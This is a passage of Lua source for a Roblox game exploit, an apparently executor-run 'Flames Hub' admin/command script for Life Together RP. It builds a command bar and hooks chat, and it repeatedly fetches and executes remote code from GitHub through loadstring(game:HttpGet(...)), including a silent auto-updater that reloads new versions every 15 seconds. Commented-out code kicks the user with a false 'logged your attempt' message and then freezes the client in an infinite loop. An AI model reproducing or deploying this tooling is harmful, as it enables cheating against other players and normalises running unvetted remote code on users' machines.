            btn.BorderSizePixel = 0
            btn.ZIndex = 7
            Instance.new("UICorner", btn).CornerRadius = UDim.new(0,6)

            table.insert(historyButtons, {btn = btn, cmd = cmd})
         end
      end

      local function pushHistory(cmd)
         if cmd == "" then return end
         if getgenv().commandHistory[#getgenv().commandHistory] == cmd then return end
         table.insert(getgenv().commandHistory, cmd)
         if #getgenv().commandHistory > 100 then
            table.remove(getgenv().commandHistory,1)
         end
         getgenv().historyIndex = #getgenv().commandHistory + 1
         rebuildHistory()
      end

      local function runCmd()
         local txt = inputBox.Text
         if txt == "" then return end
         pushHistory(txt)
         inputBox.Text = ""
         task.spawn(function()
            getgenv().DirectCommand(txt)
         end)
      end

      openUI = function()
         if openState then return end
         openState = true
         holder.Visible = true
         historyFrame.Visible = true

         holder.Position = UDim2.new(0.5,0,0,-60)
         historyFrame.Position = UDim2.new(0.5,0,0,60)

         getgenv().TweenService:Create(holder,TweenInfo.new(0.25),{Position=UDim2.new(0.5,0,0,5)}):Play()
         getgenv().TweenService:Create(historyFrame,TweenInfo.new(0.25),{Position=UDim2.new(0.5,0,0,60)}):Play()

         task.delay(0.25,function()
            inputBox:CaptureFocus()
         end)
      end

      closeUI = function()
         if not openState then return end
         openState = false
         historyFrame.Visible = false

         getgenv().TweenService:Create(holder,TweenInfo.new(0.25),{Position=UDim2.new(0.5,0,0,-60)}):Play()
         task.delay(0.25,function()
            holder.Visible = false
            inputBox.Text = ""
         end)
      end

      local function toggleBar(v)
         if typeof(v) == "boolean" then
            if v then openUI() else closeUI() end
         else
            if openState then closeUI() else openUI() end
         end
      end

      -- raw input hit detection for history buttons, bypasses GUI event system entirely
      getgenv().UserInputService.InputBegan:Connect(function(input, gp)
         if gp then return end
         if not openState then return end
         if input.UserInputType ~= Enum.UserInputType.MouseButton1 and
            input.UserInputType ~= Enum.UserInputType.Touch then return end
         if getgenv().__cmdbar_busy then return end

         local pos = input.Position

         for _, entry in ipairs(historyButtons) do
            local btn = entry.btn
            local cmd = entry.cmd
            if not btn or not btn.Parent then end

            local abs = btn.AbsolutePosition
            local size = btn.AbsoluteSize

            if pos.X >= abs.X and pos.X <= abs.X + size.X and
               pos.Y >= abs.Y and pos.Y <= abs.Y + size.Y then
               getgenv().__cmdbar_busy = true
               print("history executing: " .. tostring(cmd))
               inputBox.Text = ""
               closeUI()
               task.spawn(function()
                  getgenv().DirectCommand(cmd)
               end)
               task.defer(function()
                  getgenv().__cmdbar_busy = false
               end)
               return
            end
         end
      end)

      inputBox.InputBegan:Connect(function(i)
         if i.KeyCode == Enum.KeyCode.Up then
            getgenv().historyIndex = math.clamp(getgenv().historyIndex-1,1,#getgenv().commandHistory)
            inputBox.Text = getgenv().commandHistory[getgenv().historyIndex] or ""
            inputBox.CursorPosition = #inputBox.Text + 1
         elseif i.KeyCode == Enum.KeyCode.Down then
            getgenv().historyIndex = math.clamp(getgenv().historyIndex+1,1,#getgenv().commandHistory+1)
            inputBox.Text = getgenv().commandHistory[getgenv().historyIndex] or ""
            inputBox.CursorPosition = #inputBox.Text + 1
         end
      end)

      inputBox.FocusLost:Connect(function(enter)
         if getgenv().__cmdbar_busy then return end
         getgenv().__cmdbar_busy = true
         if enter then runCmd() end
         task.delay(0.2, function()
            closeUI()
            getgenv().__cmdbar_busy = false
         end)
      end)

      local ismobile = getgenv().UserInputService.TouchEnabled and not getgenv().UserInputService.KeyboardEnabled
      if ismobile then
         local mobilebtn = Instance.new("TextButton")
         mobilebtn.Parent = guiMain
         mobilebtn.Size = UDim2.new(0,48,0,48)
         mobilebtn.Position = UDim2.new(1,-60,1,-120)
         mobilebtn.BackgroundColor3 = Color3.fromRGB(35,35,35)
         mobilebtn.TextColor3 = Color3.new(1,1,1)
         mobilebtn.Text = ">"
         mobilebtn.Font = Enum.Font.GothamBold
         mobilebtn.TextScaled = true
         mobilebtn.BorderSizePixel = 0
         mobilebtn.ZIndex = 8
         Instance.new("UICorner", mobilebtn).CornerRadius = UDim.new(1,0)
         wait(0.5)
         dragify(mobilebtn)

         mobilebtn.Activated:Connect(function()
            getgenv().togglecommandbar()
         end)
      end

      getgenv().UserInputService.InputEnded:Connect(function(i)
         if not swallowing_prefix then return end
         local pref = tostring(getgenv().AdminPrefix or ";")

         local isprefix =
            (pref==";" and i.KeyCode==Enum.KeyCode.Semicolon) or
            (pref=="." and i.KeyCode==Enum.KeyCode.Period) or
            (pref=="," and i.KeyCode==Enum.KeyCode.Comma) or
            (pref=="'" and i.KeyCode==Enum.KeyCode.Quote) or
            (pref=="/" and i.KeyCode==Enum.KeyCode.Slash)

         if not isprefix then return end

         swallowing_prefix = false
         inputBox.TextEditable = true
      end)

      getgenv().UserInputService.InputBegan:Connect(function(i,gp)
         if gp then return end
         local pref = tostring(getgenv().AdminPrefix or ";")
         local prefixKey =
            (pref==";" and i.KeyCode==Enum.KeyCode.Semicolon) or
            (pref=="." and i.KeyCode==Enum.KeyCode.Period) or
            (pref=="," and i.KeyCode==Enum.KeyCode.Comma) or
            (pref=="'" and i.KeyCode==Enum.KeyCode.Quote) or
            (pref=="/" and i.KeyCode==Enum.KeyCode.Slash)

         if prefixKey then
            swallowing_prefix = true
            inputBox.TextEditable = false
            toggleBar(true)

            task.defer(function()
               inputBox.Text = pref
               inputBox.CursorPosition = #pref + 1
            end)
         elseif i.KeyCode == Enum.KeyCode.RightShift then
            toggleBar()
         end
      end)

      getgenv().togglecommandbar = toggleBar
      toggleBar(false)
   end

   getgenv().command_bar_GUI = command_bar_GUI
   if not executor_string:lower():find("velocity") then
      getgenv().command_bar_GUI(false)
   end
   fw(0.2)
   loadstring(game:HttpGet("https://raw.githubusercontent.com/EnterpriseExperience/MicUpSource/refs/heads/main/LifeTogetherRP_Admin_CommandHandler.lua"))()

   if not getgenv().SeenCommandAndCameraIntro then
      notify("Success", "[HOOKED]: We have hooked the Camera successfully.", 5)
      fw(0.2)
      notify("Warning", "[INITIALIZING]: Setting up command receiver...", 5)
      fw(0.1)
      getgenv().SeenCommandAndCameraIntro = true
   end

   if not getgenv().ChatMessageHooks then getgenv().ChatMessageHooks = {} end
   getgenv().global_isinchat_msghooks = function(func)
      for _, v in ipairs(getgenv().ChatMessageHooks) do
         if v == func then return true end
      end
      return false
   end

   getgenv().handle_chattercommands = function(sender, msg)
      getgenv().handleCommand(sender, msg.Text)
      if sender and sender.UserId == getgenv().LocalPlayer.UserId then
         getgenv().TextChatServiceAPI.Handle_Message(sender, tostring(msg.Text))
      end
   end

   if not global_isinchat_msghooks(handle_chattercommands) then
      table.insert(getgenv().ChatMessageHooks, handle_chattercommands)
   end

   getgenv().DirectCommand = function(text)
      local prefix = tostring(getgenv().AdminPrefix or ";")
      text = tostring(text or ""):gsub("^%s+", ""):gsub("%s+$", "")
      if text == "" then return end
      if text:sub(1, #prefix) ~= prefix then
         text = prefix .. text
      end
      local player = getgenv().LocalPlayer or game.Players.LocalPlayer
      getgenv().handleCommand(player, text)
   end

   --[[if not getgenv().Started_Automatically_Logging_Changing_Status_Loop then
      getgenv().Started_Automatically_Logging_Changing_Status_Loop = true
      task.spawn(function()
         while getgenv().chat_connected do
            task.wait(0.25)
            if not getgenv().TextChatServiceAPI then
               game.Players.LocalPlayer:Kick("Possible tampering with global variables! This is not allowed in Flames Hub! We have logged your attempt.")
               task.wait(2.5)
               while true do end
            end

            if not getgenv().chat_sender_thread then
               game.Players.LocalPlayer:Kick("Possible tampering with global variables! This is not allowed in Flames Hub! We have logged your attempt.")
               task.wait(2.5)
               while true do end
            end

            if not getgenv().Flames_Hub_Chat_API then
               game.Players.LocalPlayer:Kick("Possible tampering with global variables! This is not allowed in Flames Hub! We have logged your attempt.")
               task.wait(2.5)
               while true do end
            end
         end
      end)
   end--]]

   --[[if not getgenv().ChatMessageConnection_Second then
      local Players = getgenv().Players
      local local_user_id = Players.LocalPlayer.UserId

      getgenv().ChatMessageConnection_Second = getgenv().TextChatService.MessageReceived:Connect(function(msg)
         if not msg or not msg.TextSource then return end
         if msg.TextSource.UserId ~= local_user_id then return end
         if not msg.Text or msg.Text == "" then return end

         local sender = Players.LocalPlayer
         local hooks = getgenv().ChatMessageHooks
         if not hooks or #hooks == 0 then return end

         for i = 1, #hooks do
            local hook_func = hooks[i]
            if typeof(hook_func) ~= "function" then end
            local ok, _, elapsed = getgenv().track_time("chat_hook_" .. i, function()
               hook_func(sender, msg)
            end)

            if not ok then
               warn("[ChatHookError]: hook #" .. i)
            end
            if elapsed and elapsed > 0.01 then
               warn("[ChatHookSlow]: #" .. i .. " took " .. elapsed)
            end
         end
      end)
   end--]]

   setup_cmd_handler_plr(v)

   if not getgenv().AdminHasBeenLoaded_NotificationCheck then
      notify("Success", "[INITIALIZED]: Life Together RP-Admin has been loaded!", 7)
      notify("Success", "[LOADED]: | [Life Together-RP : Admin_Commands]: Loaded!", 7)
      getgenv().AdminHasBeenLoaded_NotificationCheck = true
   end

   function auto_add_friends()
      for _, v in ipairs(getgenv().Players:GetPlayers()) do
         if v ~= getgenv().LocalPlayer and v:IsFriendsWith(getgenv().LocalPlayer.UserId) then
            alreadyCheckedUser(v)
         end
      end
   end

   function auto_remove_friends()
      for _, v in ipairs(getgenv().Players:GetPlayers()) do
         if v ~= getgenv().LocalPlayer and v:IsFriendsWith(getgenv().LocalPlayer.UserId) and v.Character == nil then
            getgenv().Rainbow_Others_Vehicle = false
         end
      end
   end

   if getgenv().LifeTogetherRP_Admin and getgenv().Script_Loaded_Correctly_LifeTogether_Admin_Flames_Hub and getgenv().LifeTogether_Actual_Flames_Hub_Running_Functioning_Currently_On_Client then
      notify("Success", "Reloaded script successfully.", 15)
   end

   for _, v in ipairs(game.Players:GetPlayers()) do
      if v.Name == "CIippedByAura" or v.Name == "L0CKED_1N1" then
         notify("Success", "Flames Hub | Owner is currently in this server, come to me: ("..tostring(v.Name)..") for assistance (if you need help).", 45)
      end
   end

   getgenv().Script_Loaded_Correctly_LifeTogether_Admin_Flames_Hub = getgenv().Script_Loaded_Correctly_LifeTogether_Admin_Flames_Hub or true
   if not getgenv().FlamesHubOwnerPlayerAddedAdmin_Check then
      getgenv().FlamesHubOwnerPlayerAddedAdmin_Check = true

      Players.PlayerAdded:Connect(function(Player)
         local Name = Player and Player.Name
         getgenv().Blacklisted_Friends = getgenv().Blacklisted_Friends or {}

         if Player:IsFriendsWith(getgenv().LocalPlayer.UserId) then
            if not getgenv().Blacklisted_Friends[Name] then
               auto_add_friends()
            end
         end

         if Name == "CIippedByAura" or Name == "L0CKED_1N1" then
            owner_joined(Name)
            if getgenv().friend_checked[Name] then
               getgenv().player_admins[Name] = nil
            end
            if getgenv().friend_checked[Name] then
               getgenv().friend_checked[Name] = nil
            end
            if getgenv().cmds_loaded_plr[Name] then
               getgenv().cmds_loaded_plr[Name] = nil
            end
         end
      end)
   end

   if not getgenv().FlamesHubOwnerAndAdminRemoval_Check then
      getgenv().Players.PlayerRemoving:Connect(function(Player)
         local Name = Player.Name

         if Name == "CIippedByAura" or Name == "L0CKED_1N1" then
            notify("Info", "The owner of this script has left the server.", 6)
         end

         disable_rgb_for(Name)
         getgenv().fully_disable_rgb_plr(Name)
         if getgenv().Locked_Vehicles[Name] then
            getgenv().Locked_Vehicles[Name] = false
         end
         if getgenv().Unlocked_Vehicles[Name] then
            getgenv().Unlocked_Vehicles[Name] = false
         end
      end)
      fw(0.2)
      getgenv().FlamesHubOwnerAndAdminRemoval_Check = true
   end

   notify("Success", "Welcome back, "..tostring(getgenv().LocalPlayer.DisplayName)..".", 10)

   if not isMobile then
      getgenv().command_bar_GUI(false)
   end

   local function http_get_for_script_updater(url, timeout_seconds)
      timeout_seconds = timeout_seconds or 8

      local final_url = url .. (string.find(url, "?", 1, true) and "&" or "?") .. "cache=" .. tostring(math.random(1, 1e9))

      if httpreq then
         local ok, res = pcall(function()
            return httpreq({
               Url = final_url,
               Method = "GET",
               Timeout = timeout_seconds
            })
         end)

         if ok and type(res) == "table" then
            local status = res.StatusCode or res.Status or 0
            if status == 200 or status == 0 then
               local body = res.Body or res.body
               if body and #body > 0 then
                  return body
               end
            end
         end
      end

      if game and game.HttpGet then
         local ok2, body = pcall(function()
            return game:HttpGet(final_url)
         end)

         if ok2 and body and #body > 0 then
            return body
         end
      end

      return nil
   end

   local version_url = "https://raw.githubusercontent.com/EnterpriseExperience/MicUpSource/main/Script_Versions_JSON"
   local script_url = "https://raw.githubusercontent.com/EnterpriseExperience/MicUpSource/refs/heads/main/LifeTogether_RP_Admin.lua"
   local function safe_http_get(url)
      local ok, res = pcall(function()
         return http_get_for_script_updater(url)
      end)
      if ok and res and #res > 0 then
         return res
      end
   end

   local function decode_json(raw)
      local ok, data = pcall(function()
         return getgenv().HttpService:JSONDecode(raw)
      end)
      if ok and type(data) == "table" then
         return data
      end
   end

   local function Notify(msg, dur)
      dur = dur or 5

      local gui = Instance.new("ScreenGui")
      gui.Name = "CustomNotifyGui"
      gui.ResetOnSpawn = false
      gui.Parent = getgenv().CoreGui

      local frame = Instance.new("Frame")
      frame.BackgroundColor3 = Color3.fromRGB(0,0,0)
      frame.BackgroundTransparency = 1
      frame.BorderSizePixel = 0
      frame.Size = UDim2.new(0,500,0,120)
      frame.Position = UDim2.new(0,20,0,100)
      frame.Parent = gui

      Instance.new("UICorner", frame).CornerRadius = UDim.new(0,10)

      local icon = Instance.new("ImageLabel")
      icon.BackgroundTransparency = 1
      icon.Position = UDim2.new(0,15,0.5,-25)
      icon.Size = UDim2.new(0,50,0,50)
      icon.Image = "rbxasset://textures/ui/Emotes/ErrorIcon.png"
      icon.ImageTransparency = 1
      icon.Parent = frame

      local label = Instance.new("TextLabel")
      label.BackgroundTransparency = 1
      label.Position = UDim2.new(0,80,0,10)
      label.Size = UDim2.new(1,-90,1,-20)
      label.FontFace = Font.new("rbxasset://fonts/families/BuilderSans.json")
      label.Text = msg
      label.TextColor3 = Color3.fromRGB(255,255,255)
      label.TextSize = 20
      label.TextWrapped = true
      label.TextXAlignment = Enum.TextXAlignment.Left
      label.TextYAlignment = Enum.TextYAlignment.Top
      label.TextTransparency = 1
      label.Parent = frame

      getgenv().TweenService:Create(frame, TweenInfo.new(0.3), {BackgroundTransparency = 0.3}):Play()
      getgenv().TweenService:Create(icon, TweenInfo.new(0.3), {ImageTransparency = 0}):Play()
      getgenv().TweenService:Create(label, TweenInfo.new(0.3), {TextTransparency = 0}):Play()

      task.delay(dur, function()
         if not frame.Parent then return end
         getgenv().TweenService:Create(frame, TweenInfo.new(0.3), {BackgroundTransparency = 1}):Play()
         getgenv().TweenService:Create(icon, TweenInfo.new(0.3), {ImageTransparency = 1}):Play()
         getgenv().TweenService:Create(label, TweenInfo.new(0.3), {TextTransparency = 1}):Play()
         task.wait(0.35)
         gui:Destroy()
      end)
   end

   getgenv().lta_updater_running = getgenv().lta_updater_running or false
   getgenv().lta_updater_thread_id = (getgenv().lta_updater_thread_id or 0) + 1

   local thread_id = getgenv().lta_updater_thread_id

   if not getgenv().lta_updater_running then
      getgenv().lta_updater_running = true

      task.spawn(function()
         while getgenv().lta_updater_running and thread_id == getgenv().lta_updater_thread_id do
            task.wait(15)

            local raw = safe_http_get(version_url)
            if not raw then

            end

            local data = decode_json(raw)
            if not data then

            end

            local remote_version = tostring(data.LifeTogether_Admin_Version or "")
            local local_version = tostring(getgenv().Script_Version or "")

            if remote_version ~= "" and remote_version ~= local_version then
               getgenv().lta_updater_running = false

               Notify("[UPDATE DETECTED]\nLocal: "..local_version.."\nRemote: "..remote_version.."\nReloading...",6)
               wait(0.6)
               getgenv().LifeTogether_Actual_Flames_Hub_Running_Functioning_Currently_On_Client = false
               getgenv().Script_Version = nil
               getgenv().LifeTogetherRP_Admin = false
               pcall(function()
                  loadstring(game:HttpGet(script_url .. "?cache=" .. tostring(os.clock())))()
               end)

               break
            end
         end
      end)
   end
end
wait(0.5)
if not getgenv().LifeTogether_Actual_Flames_Hub_Running_Functioning_Currently_On_Client then
   getgenv().LifeTogether_Actual_Flames_Hub_Running_Functioning_Currently_On_Client = true
   getgenv().Start_Actual_Flames_Hub_Script()
end
